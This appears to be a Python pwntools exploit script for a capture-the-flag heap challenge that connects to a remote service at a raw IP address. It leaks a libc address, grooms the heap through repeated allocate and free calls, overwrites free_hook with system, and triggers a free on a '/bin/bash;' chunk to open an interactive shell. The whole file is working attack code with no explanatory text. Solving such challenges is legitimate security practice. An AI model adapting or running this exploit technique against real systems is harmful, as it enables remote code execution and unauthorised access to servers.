from pwn import *

#r = process('./chall',env={"LD_PRELOAD":"./lib/libc.so.6"})
#r = process('./chall')
r = remote('34.92.96.238',10001)
c = lambda:r.recvuntil(':')
sl  = lambda x:r.sendline(str(x))
s = lambda  x:r.send(str(x))
context.log_level='debug'
def add(size,name,callnum):
    sl(1)
    r.recvuntil('name')
    sl(size)
    c()
    sl(name)
    c()
    sl(callnum)
    return c()

def show(idx):
    sl(2)
    c()
    sl(idx)
    return r.recvuntil('choice:')

def callg(idx):
    sl(4)
    c()
    sl(idx)
    return c()

c()
add(1080,'shpik','1234')
add(1080,'shpik','1234')
add(1080,'shpik','1234')

callg(0)
callg(1)

leak = u64(show(0).split('\n')[2]+'\x00\x00')
libc = leak - 0x3b1ca0
print 'leak',hex(leak)
print 'libc',hex(libc)
malloc_hook = libc+0x1e4c30
free_hook = libc+0x3b38c8
system =  libc+0x41c30
# idx : 3~12
for i in range(9):
    add(0x60,'shpik'+str(i),str(i))

for i in range(9):
    callg(i+3)

callg(10)

for i in range(3):
    add(0x60,'sex',str(i))

callg(13)
add(0x60,'/bin/bash;',1) # 13

add(0x60,p64(0x41414141),1)
add(0x60,p64(0x41414141),1)
add(0x60,p64(0x41414141),1)
add(0x60,p64(0x41414141),1)

add(0x60,p64(free_hook),1)

add(0x60,'hi',1)
add(0x60,p64(0x41414141),1)
add(0x60,p64(system),1)
sl(4)
c()
sl(15)
r.interactive()